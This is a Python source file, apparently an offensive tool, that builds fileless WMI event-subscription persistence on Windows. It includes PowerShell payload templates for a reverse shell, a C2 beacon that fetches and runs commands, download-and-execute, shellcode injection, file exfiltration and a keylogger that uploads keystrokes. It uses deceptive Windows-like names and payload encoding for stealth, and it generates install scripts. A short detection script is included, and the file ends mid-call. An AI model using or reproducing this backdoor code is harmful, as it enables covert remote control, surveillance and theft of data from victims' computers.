#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════════╗
║                        👻 WMI EVENT CONSUMER BACKDOOR                                      ║
║                          Fileless Persistence via WMI Subscriptions                        ║
║                                                                                            ║
║  "Dosya bırakmadan kalıcılık - Registry'de görünmez"                                       ║
║                                                                                            ║
║  Features:                                                                                 ║
║  ├── Event Filter Generation (System events, Time-based)                                   ║
║  ├── Event Consumer Generation (PowerShell, Script, Command)                               ║
║  ├── Filter-to-Consumer Binding                                                            ║
║  ├── Fileless Payload Execution                                                            ║
║  └── Anti-forensics & Stealth                                                              ║
║                                                                                            ║
║  WARNING: For authorized security testing only                                             ║
╚═══════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import base64
import hashlib
import sqlite3
import logging
import threading
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from enum import Enum

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class TriggerType(Enum):
    """WMI Event trigger types"""
    STARTUP = "startup"                  # System startup
    LOGON = "logon"                      # User logon
    PROCESS_START = "process_start"      # Specific process starts
    PROCESS_STOP = "process_stop"        # Specific process stops
    USB_INSERT = "usb_insert"            # USB device insertion
    NETWORK_CONNECT = "network_connect"  # Network connection
    TIME_INTERVAL = "time_interval"      # Periodic execution
    TIME_ABSOLUTE = "time_absolute"      # Specific time
    FILE_CREATE = "file_create"          # File creation
    SERVICE_START = "service_start"      # Service starts


class ConsumerType(Enum):
    """WMI Event consumer types"""
    COMMAND_LINE = "command_line"        # CommandLineEventConsumer
    ACTIVE_SCRIPT = "active_script"      # ActiveScriptEventConsumer
    POWERSHELL = "powershell"            # PowerShell via CommandLine
    LOG_FILE = "log_file"                # LogFileEventConsumer (for testing)


class PayloadEncoding(Enum):
    """Payload encoding methods"""
    BASE64 = "base64"
    XOR = "xor"
    AES = "aes"
    BXOR_BASE64 = "bxor_base64"  # XOR then Base64
    GZIP_BASE64 = "gzip_base64"  # Gzip then Base64


@dataclass
class WMIEventFilter:
    """WMI Event Filter definition"""
    filter_id: str
    name: str
    trigger_type: TriggerType
    query: str
    query_language: str = "WQL"
    namespace: str = "root\\cimv2"
    description: str = ""
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class WMIEventConsumer:
    """WMI Event Consumer definition"""
    consumer_id: str
    name: str
    consumer_type: ConsumerType
    payload: str
    encoded_payload: str = ""
    encoding: PayloadEncoding = PayloadEncoding.BASE64
    description: str = ""
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class WMIBinding:
    """WMI Filter-to-Consumer Binding"""
    binding_id: str
    filter_id: str
    consumer_id: str
    filter_name: str
    consumer_name: str
    status: str = "pending"
    deployed_at: Optional[str] = None


@dataclass
class WMIPersistenceProfile:
    """Complete WMI persistence configuration"""
    profile_id: str
    name: str
    filter: WMIEventFilter
    consumer: WMIEventConsumer
    binding: WMIBinding
    install_script: str = ""
    remove_script: str = ""
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class WMIPersistenceEngine:
    """
    WMI Event Consumer Backdoor Engine
    
    Creates fileless persistence using WMI Event Subscriptions.
    The payload lives entirely in WMI repository - no files on disk.
    """
    
    _instance = None
    _lock = threading.Lock()
    
    # WQL Query templates for different triggers
    TRIGGER_QUERIES = {
        TriggerType.STARTUP: """
            SELECT * FROM __InstanceModificationEvent WITHIN 60 
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
            AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
        """,
        TriggerType.LOGON: """
            SELECT * FROM __InstanceCreationEvent WITHIN 15 
            WHERE TargetInstance ISA 'Win32_LogonSession' 
            AND TargetInstance.LogonType = 2
        """,
        TriggerType.PROCESS_START: """
            SELECT * FROM __InstanceCreationEvent WITHIN 5 
            WHERE TargetInstance ISA 'Win32_Process' 
            AND TargetInstance.Name = '{process_name}'
        """,
        TriggerType.PROCESS_STOP: """
            SELECT * FROM __InstanceDeletionEvent WITHIN 5 
            WHERE TargetInstance ISA 'Win32_Process' 
            AND TargetInstance.Name = '{process_name}'
        """,
        TriggerType.USB_INSERT: """
            SELECT * FROM __InstanceCreationEvent WITHIN 10 
            WHERE TargetInstance ISA 'Win32_DiskDrive' 
            AND TargetInstance.InterfaceType = 'USB'
        """,
        TriggerType.NETWORK_CONNECT: """
            SELECT * FROM __InstanceModificationEvent WITHIN 30 
            WHERE TargetInstance ISA 'Win32_NetworkAdapter' 
            AND TargetInstance.NetConnectionStatus = 2
        """,
        TriggerType.TIME_INTERVAL: """
            SELECT * FROM __InstanceModificationEvent WITHIN 60 
            WHERE TargetInstance ISA 'Win32_LocalTime' 
            AND TargetInstance.Second = 0 
            AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30)
        """,
        TriggerType.TIME_ABSOLUTE: """
            SELECT * FROM __InstanceModificationEvent WITHIN 60 
            WHERE TargetInstance ISA 'Win32_LocalTime' 
            AND TargetInstance.Hour = {hour} 
            AND TargetInstance.Minute = {minute}
        """,
        TriggerType.FILE_CREATE: """
            SELECT * FROM __InstanceCreationEvent WITHIN 10 
            WHERE TargetInstance ISA 'CIM_DataFile' 
            AND TargetInstance.Drive = 'C:' 
            AND TargetInstance.Path LIKE '%{path_pattern}%'
        """,
        TriggerType.SERVICE_START: """
            SELECT * FROM __InstanceModificationEvent WITHIN 10 
            WHERE TargetInstance ISA 'Win32_Service' 
            AND TargetInstance.Name = '{service_name}' 
            AND TargetInstance.State = 'Running'
        """
    }
    
    # PowerShell payload templates
    PAYLOAD_TEMPLATES = {
        "reverse_shell": '''
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
''',
        "beacon": '''
while($true){{
    try{{
        $wc = New-Object System.Net.WebClient;
        $wc.Headers.Add("User-Agent", "Mozilla/5.0");
        $wc.Headers.Add("X-ID", [System.Environment]::MachineName);
        $cmd = $wc.DownloadString("{c2_url}/beacon");
        if($cmd -and $cmd.Length -gt 0){{
            $output = iex $cmd 2>&1 | Out-String;
            $wc.UploadString("{c2_url}/result", $output)
        }}
    }}catch{{}}
    Start-Sleep -Seconds {interval}
}}
''',
        "download_exec": '''
$wc = New-Object System.Net.WebClient;
$wc.Headers.Add("User-Agent", "Mozilla/5.0");
$payload = $wc.DownloadString("{url}");
iex $payload
''',
        "stager": '''
$bytes = [System.Convert]::FromBase64String("{shellcode_b64}");
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length);
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length);
$callback = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[[IntPtr]]]::GetType());
$callback.Invoke([IntPtr]::Zero)
''',
        "data_exfil": '''
$files = Get-ChildItem -Path {path} -Include {patterns} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 50;
foreach($f in $files){{
    $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($f.FullName));
    $wc = New-Object System.Net.WebClient;
    $wc.Headers.Add("X-File", $f.Name);
    $wc.UploadString("{exfil_url}", $content)
}}
''',
        "keylogger": '''
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keylogger {{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}}
"@
$log = "";
while($true){{
    Start-Sleep -Milliseconds 50;
    for($i=8;$i -le 190;$i++){{
        if([Keylogger]::GetAsyncKeyState($i) -eq -32767){{
            $log += [char]$i;
            if($log.Length -ge 100){{
                $wc = New-Object Net.WebClient;
                $wc.UploadString("{exfil_url}", $log);
                $log = ""
            }}
        }}
    }}
}}
'''
    }
    
    # Legitimate-looking filter and consumer names for stealth
    STEALTH_NAMES = {
        "filters": [
            "Windows_Update_Filter",
            "Telemetry_Collection_Filter",
            "Performance_Monitor_Filter",
            "Security_Audit_Filter",
            "System_Health_Filter",
            "Driver_Update_Filter",
            "Scheduled_Maintenance_Filter",
            "Diagnostic_Data_Filter"
        ],
        "consumers": [
            "Windows_Update_Consumer",
            "Telemetry_Collection_Consumer",
            "Performance_Monitor_Consumer",
            "Security_Audit_Consumer",
            "System_Health_Consumer",
            "Driver_Update_Consumer",
            "Scheduled_Maintenance_Consumer",
            "Diagnostic_Data_Consumer"
        ]
    }
    
    def __new__(cls, db_path: str = "wmi_persistence.db"):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, db_path: str = "wmi_persistence.db"):
        if self._initialized:
            return
        
        self.db_path = db_path
        self._init_database()
        self._initialized = True
        logger.info("👻 WMI Persistence Engine initialized")
    
    def _init_database(self):
        """Initialize SQLite database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS event_filters (
                    filter_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    trigger_type TEXT NOT NULL,
                    query TEXT NOT NULL,
                    query_language TEXT DEFAULT 'WQL',
                    namespace TEXT DEFAULT 'root\\cimv2',
                    description TEXT,
                    created_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS event_consumers (
                    consumer_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    consumer_type TEXT NOT NULL,
                    payload TEXT NOT NULL,
                    encoded_payload TEXT,
                    encoding TEXT,
                    description TEXT,
                    created_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS bindings (
                    binding_id TEXT PRIMARY KEY,
                    filter_id TEXT,
                    consumer_id TEXT,
                    filter_name TEXT,
                    consumer_name TEXT,
                    status TEXT DEFAULT 'pending',
                    deployed_at TEXT,
                    FOREIGN KEY (filter_id) REFERENCES event_filters(filter_id),
                    FOREIGN KEY (consumer_id) REFERENCES event_consumers(consumer_id)
                );
                
                CREATE TABLE IF NOT EXISTS profiles (
                    profile_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    filter_id TEXT,
                    consumer_id TEXT,
                    binding_id TEXT,
                    install_script TEXT,
                    remove_script TEXT,
                    created_at TEXT
                );
            """)
    
    def create_event_filter(
        self,
        trigger_type: TriggerType,
        name: str = None,
        custom_query: str = None,
        **query_params
    ) -> WMIEventFilter:
        """
        Create a WMI Event Filter
        
        Args:
            trigger_type: Type of trigger event
            name: Filter name (auto-generated if None)
            custom_query: Custom WQL query (overrides trigger_type)
            **query_params: Parameters for query template
            
        Returns:
            WMIEventFilter object
        """
        # Auto-generate stealth name
        if not name:
            name = random.choice(self.STEALTH_NAMES["filters"]) + "_" + self._random_suffix()
        
        # Get query from template or use custom
        if custom_query:
            query = custom_query
        else:
            query_template = self.TRIGGER_QUERIES.get(trigger_type, "")
            query = query_template.format(**query_params) if query_params else query_template
        
        # Clean up query whitespace
        query = " ".join(query.split())
        
        event_filter = WMIEventFilter(
            filter_id=hashlib.md5(f"{name}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            name=name,
            trigger_type=trigger_type,
            query=query,
            description=f"Event filter for {trigger_type.value} trigger"
        )
        
        self._save_filter(event_filter)
        logger.info(f"👻 Created event filter: {name}")
        
        return event_filter
    
    def create_event_consumer(
        self,
        consumer_type: ConsumerType,
        payload: str = None,
        payload_template: str = None,
        name: str = None,
        encoding: PayloadEncoding = PayloadEncoding.BASE64,
        **template_params
    ) -> WMIEventConsumer:
        """
        Create a WMI Event Consumer
        
        Args:
            consumer_type: Type of consumer
            payload: Raw payload (PowerShell, script, command)
            payload_template: Template name from PAYLOAD_TEMPLATES
            name: Consumer name (auto-generated if None)
            encoding: Payload encoding method
            **template_params: Parameters for payload template
            
        Returns:
            WMIEventConsumer object
        """
        # Auto-generate stealth name
        if not name:
            name = random.choice(self.STEALTH_NAMES["consumers"]) + "_" + self._random_suffix()
        
        # Get payload from template or use provided
        if payload_template and payload_template in self.PAYLOAD_TEMPLATES:
            payload = self.PAYLOAD_TEMPLATES[payload_template].format(**template_params)
        elif not payload:
            payload = "# Empty payload"
        
        # Encode payload
        encoded_payload = self._encode_payload(payload, encoding)
        
        consumer = WMIEventConsumer(
            consumer_id=hashlib.md5(f"{name}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            name=name,
            consumer_type=consumer_type,
            payload=payload,
            encoded_payload=encoded_payload,
            encoding=encoding,
            description=f"Event consumer ({consumer_type.value})"
        )
        
        self._save_consumer(consumer)
        logger.info(f"👻 Created event consumer: {name}")
        
        return consumer
    
    def create_binding(
        self,
        event_filter: WMIEventFilter,
        event_consumer: WMIEventConsumer
    ) -> WMIBinding:
        """
        Create a Filter-to-Consumer Binding
        
        Args:
            event_filter: Event filter object
            event_consumer: Event consumer object
            
        Returns:
            WMIBinding object
        """
        binding = WMIBinding(
            binding_id=hashlib.md5(f"{event_filter.filter_id}_{event_consumer.consumer_id}".encode()).hexdigest()[:12],
            filter_id=event_filter.filter_id,
            consumer_id=event_consumer.consumer_id,
            filter_name=event_filter.name,
            consumer_name=event_consumer.name
        )
        
        self._save_binding(binding)
        logger.info(f"👻 Created binding: {event_filter.name} → {event_consumer.name}")
        
        return binding
    
    def create_persistence_profile(
        self,
        name: str,
        trigger_type: TriggerType,
        consumer_type: ConsumerType = ConsumerType.POWERSHELL,
        payload: str = None,
        payload_template: str = None,
        encoding: PayloadEncoding = PayloadEncoding.BASE64,
        stealth: bool = True,
        **params
    ) -> WMIPersistenceProfile:
        """
        Create a complete WMI persistence profile
        
        Args:
            name: Profile name
            trigger_type: When to trigger
            consumer_type: How to execute payload
            payload: Raw payload
            payload_template: Template name
            encoding: Payload encoding
            stealth: Use stealth naming
            **params: Additional parameters
            
        Returns:
            WMIPersistenceProfile with all components
        """
        # Create filter
        filter_name = None if stealth else f"{name}_Filter"
        query_params = {k: v for k, v in params.items() if k in ['process_name', 'service_name', 'hour', 'minute', 'path_pattern']}
        event_filter = self.create_event_filter(trigger_type, filter_name, **query_params)
        
        # Create consumer
        consumer_name = None if stealth else f"{name}_Consumer"
        template_params = {k: v for k, v in params.items() if k in ['host', 'port', 'c2_url', 'interval', 'url', 'shellcode_b64', 'path', 'patterns', 'exfil_url']}
        event_consumer = self.create_event_consumer(
            consumer_type, payload, payload_template, consumer_name, encoding, **template_params
        )
        
        # Create binding
        binding = self.create_binding(event_filter, event_consumer)
        
        # Generate scripts
        install_script = self._generate_install_script(event_filter, event_consumer, binding)
        remove_script = self._generate_remove_script(event_filter, event_consumer, binding)
        
        profile = WMIPersistenceProfile(
            profile_id=hashlib.md5(f"{name}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            name=name,
            filter=event_filter,
            consumer=event_consumer,
            binding=binding,
            install_script=install_script,
            remove_script=remove_script
        )
        
        self._save_profile(profile)
        logger.info(f"👻 Created persistence profile: {name}")
        
        return profile
    
    def _encode_payload(self, payload: str, encoding: PayloadEncoding) -> str:
        """Encode payload using specified method"""
        if encoding == PayloadEncoding.BASE64:
            # PowerShell-compatible UTF-16LE Base64
            payload_bytes = payload.encode('utf-16-le')
            return base64.b64encode(payload_bytes).decode()
        
        elif encoding == PayloadEncoding.XOR:
            key = random.randint(1, 255)
            xored = bytes([b ^ key for b in payload.encode()])
            return f"XOR:{key}:" + base64.b64encode(xored).decode()
        
        elif encoding == PayloadEncoding.BXOR_BASE64:
            key = random.randint(1, 255)
            xored = bytes([b ^ key for b in payload.encode()])
            b64 = base64.b64encode(xored).decode()
            return f"BXOR:{key}:" + b64
        
        elif encoding == PayloadEncoding.GZIP_BASE64:
            import gzip
            compressed = gzip.compress(payload.encode())
            return "GZIP:" + base64.b64encode(compressed).decode()
        
        return payload
    
    def _generate_install_script(
        self,
        event_filter: WMIEventFilter,
        event_consumer: WMIEventConsumer,
        binding: WMIBinding
    ) -> str:
        """Generate PowerShell installation script"""
        
        # Escape quotes in query
        escaped_query = event_filter.query.replace("'", "''")
        
        # Build consumer-specific creation based on type
        if event_consumer.consumer_type == ConsumerType.POWERSHELL:
            # Use CommandLineEventConsumer with encoded PowerShell
            consumer_creation = f'''
# Create CommandLineEventConsumer for PowerShell
$ConsumerArgs = @{{
    Name = '{event_consumer.name}'
    CommandLineTemplate = 'powershell.exe -NoP -NonI -W Hidden -Enc {event_consumer.encoded_payload}'
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $ConsumerArgs
'''
        elif event_consumer.consumer_type == ConsumerType.ACTIVE_SCRIPT:
            # Use ActiveScriptEventConsumer for VBScript/JScript
            escaped_script = event_consumer.payload.replace("'", "''").replace('"', '""')
            consumer_creation = f'''
# Create ActiveScriptEventConsumer
$ConsumerArgs = @{{
    Name = '{event_consumer.name}'
    ScriptingEngine = 'VBScript'
    ScriptText = @'
{escaped_script}
'@
}}
$Consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\\subscription" -Arguments $ConsumerArgs
'''
        else:  # COMMAND_LINE
            consumer_creation = f'''
# Create CommandLineEventConsumer
$ConsumerArgs = @{{
    Name = '{event_consumer.name}'
    CommandLineTemplate = '{event_consumer.payload}'
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $ConsumerArgs
'''
        
        script = f'''<#
.SYNOPSIS
    WMI Persistence Installation Script
    
.DESCRIPTION
    Creates fileless persistence using WMI Event Subscriptions
    
    Filter: {event_filter.name}
    Consumer: {event_consumer.name}
    Trigger: {event_filter.trigger_type.value}
    
.NOTES
    Requires Administrator privileges
    The payload lives entirely in WMI repository - no files on disk
#>

# Requires elevation
#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"

Write-Host "[*] Installing WMI persistence..." -ForegroundColor Cyan

try {{
    # Remove existing if present (clean install)
    Write-Host "[*] Cleaning up existing subscriptions..."
    Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='{event_filter.name}'" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='{event_consumer.name}'" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Filter "Name='{event_consumer.name}'" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Filter "Filter=""__EventFilter.Name='{event_filter.name}'""" | Remove-WmiObject -ErrorAction SilentlyContinue
    
    # Create Event Filter
    Write-Host "[*] Creating event filter: {event_filter.name}"
    $FilterArgs = @{{
        Name = '{event_filter.name}'
        EventNamespace = '{event_filter.namespace}'
        QueryLanguage = '{event_filter.query_language}'
        Query = '{escaped_query}'
    }}
    $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments $FilterArgs
    
    {consumer_creation}
    
    # Create Binding
    Write-Host "[*] Creating filter-to-consumer binding..."
    $BindingArgs = @{{
        Filter = $Filter
        Consumer = $Consumer
    }}
    $Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments $BindingArgs
    
    Write-Host "[+] WMI persistence installed successfully!" -ForegroundColor Green
    Write-Host "[+] Trigger: {event_filter.trigger_type.value}" -ForegroundColor Green
    
    # Verify installation
    Write-Host ""
    Write-Host "[*] Verifying installation..." -ForegroundColor Yellow
    $VerifyFilter = Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='{event_filter.name}'"
    $VerifyConsumer = Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='{event_consumer.name}'"
    if (-not $VerifyConsumer) {{
        $VerifyConsumer = Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Filter "Name='{event_consumer.name}'"
    }}
    $VerifyBinding = Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match '{event_filter.name}' }}
    
    if ($VerifyFilter -and $VerifyConsumer -and $VerifyBinding) {{
        Write-Host "[+] All components verified!" -ForegroundColor Green
    }} else {{
        Write-Warning "Some components may not have installed correctly"
    }}
    
}} catch {{
    Write-Error "[!] Installation failed: $_"
    exit 1
}}
'''
        return script
    
    def _generate_remove_script(
        self,
        event_filter: WMIEventFilter,
        event_consumer: WMIEventConsumer,
        binding: WMIBinding
    ) -> str:
        """Generate PowerShell removal script"""
        
        script = f'''<#
.SYNOPSIS
    WMI Persistence Removal Script
    
.DESCRIPTION
    Removes WMI Event Subscription persistence
    
    Filter: {event_filter.name}
    Consumer: {event_consumer.name}
    
.NOTES
    Requires Administrator privileges
#>

#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Removing WMI persistence..." -ForegroundColor Cyan

# Remove Binding first
Write-Host "[*] Removing binding..."
Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | 
    Where-Object {{ $_.Filter -match '{event_filter.name}' }} | 
    Remove-WmiObject

# Remove Consumer
Write-Host "[*] Removing consumer..."
Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='{event_consumer.name}'" | Remove-WmiObject
Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Filter "Name='{event_consumer.name}'" | Remove-WmiObject

# Remove Filter
Write-Host "[*] Removing filter..."
Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='{event_filter.name}'" | Remove-WmiObject

Write-Host "[+] WMI persistence removed!" -ForegroundColor Green

# Verify removal
$Remaining = @()
$Remaining += Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='{event_filter.name}'"
$Remaining += Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='{event_consumer.name}'"
$Remaining += Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer -Filter "Name='{event_consumer.name}'"

if ($Remaining.Count -eq 0) {{
    Write-Host "[+] All components successfully removed!" -ForegroundColor Green
}} else {{
    Write-Warning "Some components may still exist"
}}
'''
        return script
    
    def generate_detection_script(self) -> str:
        """Generate script to detect WMI persistence"""
        
        return '''<#
.SYNOPSIS
    WMI Persistence Detection Script
    
.DESCRIPTION
    Enumerates all WMI Event Subscriptions that could indicate persistence
    
.NOTES
    Run as Administrator for full visibility
#>

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   WMI Persistence Detection Scanner   " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Event Filters
Write-Host "[*] Checking Event Filters..." -ForegroundColor Yellow
$Filters = Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter
if ($Filters) {
    foreach ($f in $Filters) {
        Write-Host "  [!] Filter: $($f.Name)" -ForegroundColor Red
        Write-Host "      Query: $($f.Query)" -ForegroundColor Gray
    }
} else {
    Write-Host "  [+] No event filters found" -ForegroundColor Green
}

Write-Host ""

# Event Consumers
Write-Host "[*] Checking Event Consumers..." -ForegroundColor Yellow

# CommandLineEventConsumer
$CmdConsumers = Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer
foreach ($c in $CmdConsumers) {
    Write-Host "  [!] CommandLine Consumer: $($c.Name)" -ForegroundColor Red
    Write-Host "      Command: $($c.CommandLineTemplate)" -ForegroundColor Gray
}

# ActiveScriptEventConsumer
$ScriptConsumers = Get-WmiObject -Namespace "root\\subscription" -Class ActiveScriptEventConsumer
foreach ($c in $ScriptConsumers) {
    Write-Host "  [!] ActiveScript Consumer: $($c.Name)" -ForegroundColor Red
    Write-Host "      Engine: $($c.ScriptingEngine)" -ForegroundColor Gray
    Write-Host "      Script: $($c.ScriptText.Substring(0, [Math]::Min(100, $c.ScriptText.Length)))..." -ForegroundColor Gray
}

if (-not $CmdConsumers -and -not $ScriptConsumers) {
    Write-Host "  [+] No suspicious consumers found" -ForegroundColor Green
}

Write-Host ""

# Bindings
Write-Host "[*] Checking Bindings..." -ForegroundColor Yellow
$Bindings = Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding
if ($Bindings) {
    foreach ($b in $Bindings) {
        Write-Host "  [!] Binding Found:" -ForegroundColor Red
        Write-Host "      Filter: $($b.Filter)" -ForegroundColor Gray
        Write-Host "      Consumer: $($b.Consumer)" -ForegroundColor Gray
    }
} else {
    Write-Host "  [+] No bindings found" -ForegroundColor Green
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "            Scan Complete              " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
'''
    
    def _random_suffix(self, length: int = 6) -> str:
        """Generate random alphanumeric suffix"""
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    def get_filters(self) -> List[Dict]:
        """Get all event filters"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM event_filters ORDER BY created_at DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_consumers(self) -> List[Dict]:
        """Get all event consumers"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM event_consumers ORDER BY created_at DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_profiles(self) -> List[Dict]:
        """Get all persistence profiles"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM profiles ORDER BY created_at DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_profile(self, profile_id: str) -> Optional[Dict]:
        """Get specific profile"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM profiles WHERE profile_id = ?", (profile_id,))
            row = cursor.fetchone()
            return dict(row) if row else None
    
    def _save_filter(self, event_filter: WMIEventFilter):
        """Save event filter to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO event_filters 
                (filter_id, name, trigger_type, query, query_language, namespace, description, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                event_filter.filter_id, event_filter.name, event_filter.trigger_type.value,
                event_filter.query, event_filter.query_language, event_filter.namespace,
                event_filter.description, event_filter.created_at
            ))
    
    def _save_consumer(self, consumer: WMIEventConsumer):
        """Save event consumer to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO event_consumers 
                (consumer_id, name, consumer_type, payload, encoded_payload, encoding, description, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                consumer.consumer_id, consumer.name, consumer.consumer_type.value,
                consumer.payload, consumer.encoded_payload, consumer.encoding.value,
                consumer.description, consumer.created_at
            ))
    
    def _save_binding(self, binding: WMIBinding):
        """Save binding to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO bindings 
                (binding_id, filter_id, consumer_id, filter_name, consumer_name, status, deployed_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                binding.binding_id, binding.filter_id, binding.consumer_id,
                binding.filter_name, binding.consumer_name, binding.status, binding.deployed_at
            ))
    
    def _save_profile(self, profile: WMIPersistenceProfile):
        """Save profile to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO profiles 
                (profile_id, name, filter_id, consumer_id, binding_id, install_script, remove_script, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                profile.profile_id, profile.name, profile.filter.filter_id,
                profile.consumer.consumer_id, profile.binding.binding_id,
                profile.install_script, profile.remove_script, profile.created_at
            ))
    
    def get_stats(self) -> Dict:
        """Get engine statistics"""
        with sqlite3.connect(self.db_path) as conn:
            filters = conn.execute("SELECT COUNT(*) FROM event_filters").fetchone()[0]
            consumers = conn.execute("SELECT COUNT(*) FROM event_consumers").fetchone()[0]
            profiles = conn.execute("SELECT COUNT(*) FROM profiles").fetchone()[0]
            
            return {
                "event_filters": filters,
                "event_consumers": consumers,
                "profiles": profiles,
                "trigger_types": len(TriggerType),
                "consumer_types": len(ConsumerType),
                "payload_templates": len(self.PAYLOAD_TEMPLATES)
            }


# Singleton instance
_engine_instance = None

def get_engine() -> WMIPersistenceEngine:
    """Get or create the engine singleton"""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = WMIPersistenceEngine()
    return _engine_instance


if __name__ == "__main__":
    # Demo usage
    engine = get_engine()
    
    print("👻 WMI Persistence Engine Demo")
    print("=" * 60)
    
    # Create a startup persistence profile with beacon payload
    print("\n📋 Creating startup persistence profile...")
    profile = engine.create_persistence_profile(
        name="StartupBeacon",
        trigger_type=TriggerType.STARTUP,
        consumer_type=ConsumerType.POWERSHELL,
        payload_template="beacon",
        c2_url="http://192.168.1.100:8080",
        interval=60,
        stealth=True
    )
    
    print(f"  ✓ Profile ID: {profile.profile_id}")
    print(f"  ✓ Filter: {profile.filter.name}")
    print(f"  ✓ Consumer: {profile.consumer.name}")
    print(f"  ✓ Trigger: {profile.filter.trigger_type.value}")
    
    # Create a process-based trigger
    print("\n📋 Creating process-based persistence...")
    profile2 = engine.create_persistence_profile(
        name="ProcessTrigger",
